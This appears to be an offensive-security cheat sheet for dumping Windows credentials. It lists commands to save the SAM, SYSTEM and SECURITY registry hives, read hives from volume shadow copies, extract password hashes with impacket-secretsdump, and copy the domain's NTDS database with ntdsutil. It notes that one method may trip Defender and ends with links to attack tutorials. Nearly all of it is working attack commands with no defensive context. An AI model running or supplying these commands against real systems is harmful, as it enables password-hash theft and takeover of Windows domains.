
Via CLI from registry - Might trip defender

```
-   reg save HKLM\sam sam
-   reg save HKLM\system system
-   reg save hklm\security security

```

```
icacls \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\system32\config\system
```

Check for vss
```
vssadmin list shadows
```

from vss
```
powershell.exe -c "[Console]::OpenStandardInput().CopyTo([Console]::OpenStandardOutput())" < "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\Config\SYSTEM" > System.copy

```

Dump secrets with impacket to text file

```
impacket-secretsdump -ntds ntds.dit -system system -security security LOCAL > hashes.txt
```

ntdsutil-dumping domain user hashes as DA

```
ntdsutil
activate instance ntds
ifm
create full C:\ntdsutil
quit
quit
```


followup links:

https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/
https://www.hackingarticles.in/credential-dumping-domain-cache-credential/
https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials
https://tobtu.com/lmntlm.php